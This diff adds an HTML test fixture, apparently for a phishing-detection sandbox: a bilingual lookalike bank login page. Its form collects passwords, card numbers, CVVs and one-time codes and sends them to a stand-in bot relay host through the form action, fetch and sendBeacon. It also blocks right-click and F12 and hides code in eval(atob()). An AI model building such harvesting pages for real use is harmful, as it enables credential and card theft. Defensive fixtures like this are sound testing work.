@@ -1,0 +1,39 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Falcon Demo Bank - Secure Login</title>
+<meta name="robots" content="noindex">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<!-- lookalike FIXTURE: assets are hot-linked from the official fixture host -->
+<link rel="icon" type="image/png" href="http://falcon-demo-bank.test/assets/favicon.png">
+<link rel="stylesheet" href="http://falcon-demo-bank.test/assets/style.css">
+</head>
+<body oncontextmenu="return false">
+<div class="fl-banner">TEST FIXTURE, not a real site / صفحة اختبار، ليست موقعاً حقيقياً</div>
+<header><img src="http://falcon-demo-bank.test/assets/logo.png" alt="Falcon Demo Bank logo" width="80" height="80">
+<h1>Falcon Demo Bank</h1></header>
+<main>
+<p>Your account is limited. Verify now to continue. / حسابك مقيّد، تحقق الآن للمتابعة.</p>
+<!-- the form posts to an internal host that answers 404; the sandbox never submits it -->
+<form id="f" action="http://falcon-bot-relay.test/bot123456:FAKE/sendMessage" method="post">
+<label>Username / اسم المستخدم <input type="text" name="username" autocomplete="username"></label>
+<label>Password / كلمة المرور <input type="password" name="password" autocomplete="current-password"></label>
+<label>Card number / رقم البطاقة <input type="text" name="card_number" autocomplete="cc-number"></label>
+<label>CVV / رمز الأمان <input type="text" name="cvv" maxlength="3"></label>
+<label>رمز التحقق (OTP) <input type="text" name="otp" inputmode="numeric" maxlength="6"></label>
+<button type="submit">Verify / تحقق</button>
+</form>
+</main>
+<script>
+// Never executed by the sandbox: no one submits the form.
+function exfil(data) {
+  fetch("http://falcon-bot-relay.test/bot123456:FAKE/sendMessage", {method: "POST", body: JSON.stringify(data)});
+}
+document.addEventListener("keydown", function (e) { if (e.keyCode == 123) { e.preventDefault(); } });
+eval(atob("d2luZG93Ll9fZmxfZml4dHVyZT0xOw=="));
+// visit ping fires on load; the sandbox blocks it and records the target
+navigator.sendBeacon("http://falcon-bot-relay.test/bot123456:FAKE/sendMessage", "visit");
+</script>
+</body>
+</html>
